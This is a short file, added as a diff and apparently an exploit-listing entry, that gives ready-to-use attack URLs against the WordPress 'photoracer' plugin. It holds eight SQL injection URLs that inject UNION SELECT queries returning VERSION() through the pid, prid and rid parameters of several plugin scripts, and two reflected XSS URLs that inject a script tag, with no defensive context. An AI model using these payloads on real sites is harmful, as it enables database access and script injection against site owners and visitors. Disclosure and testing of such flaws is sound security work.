@@ -1,0 +1,15 @@
+SQL injection:
+
+http://www.example.com/wp-content/plugins/photoracer/mostvoted.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7 
+http://www.example.com/wp-content/plugins/photoracer/mostvoted.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+http://www.example.com/wp-content/plugins/photoracer/mostviewed.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+http://www.example.com/wp-content/plugins/photoracer/mostviewed.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+http://www.example.com/wp-content/plugins/photoracer/crono.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+http://www.example.com/wp-content/plugins/photoracer/crono.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+http://www.example.com/wp-content/plugins/photoracer/changefrom.php?rid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+http://www.example.com/wp-content/plugins/photoracer/changeto.php?rid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+
+XSS :
+
+http://www.example.com/wp-content/plugins/photoracer/changefrom.php?rid="><script>alert(1);</script>
+http://www.example.com/wp-content/plugins/photoracer/changeto.php?rid="><script>alert(1);</script>
